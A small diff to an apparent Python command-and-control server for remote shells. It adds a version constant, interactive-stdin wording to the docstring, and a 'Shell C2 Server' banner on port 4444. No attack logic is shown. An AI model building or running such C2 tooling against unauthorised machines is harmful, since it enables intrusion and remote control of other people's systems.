@@ -1,9 +1,11 @@
 #!/usr/bin/env python3
 """
-HTTP-based C2 server with multi-client, streaming output and cancel support.
-Runs on Mac behind Cloudflare Tunnel.
+HTTP-based C2 server with multi-client, streaming output, interactive stdin,
+and cancel support. Runs on Mac behind Cloudflare Tunnel.
 Usage: python3 server.py
 """
+
+VERSION = "2.5.0"
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
@@ -444,6 +446,7 @@ def status_printer():
 if __name__ == "__main__":
     PORT = 4444
     server = DualStackHTTPServer(("::", PORT), Handler)
+    print(f"[*] Shell C2 Server v{VERSION}")
     print(f"[*] Listening on port {PORT} (IPv4 + IPv6)")
     print("[*] Waiting for clients to connect...")
     print("[*] Type 'help' for built-in commands\n")
